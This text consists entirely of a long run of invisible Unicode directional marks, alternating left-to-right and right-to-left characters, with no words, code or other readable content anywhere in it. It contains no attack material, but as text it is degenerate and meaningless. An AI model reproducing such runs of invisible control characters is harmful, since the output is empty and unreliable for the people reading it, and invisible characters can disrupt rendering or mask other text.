‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎